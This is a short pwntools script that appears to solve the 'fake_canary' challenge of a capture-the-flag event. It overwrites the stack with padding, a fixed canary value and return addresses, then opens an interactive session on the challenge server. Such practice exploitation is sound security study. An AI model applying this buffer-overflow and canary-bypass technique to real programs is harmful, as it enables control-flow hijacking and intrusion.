from pwn import *

#p = process('fake_canary')
p = remote('chal.imaginaryctf.org', 42002)
#pid = gdb.attach(p,gdbscript="")

payload = 'a'*40
payload += p64(0xdeadbeef)
payload += 'aaaaaaaa'
payload += p64(0x0000000000400536)
payload += p64(0x00400725)


p.sendlineafter('name?\n',payload)

p.interactive()
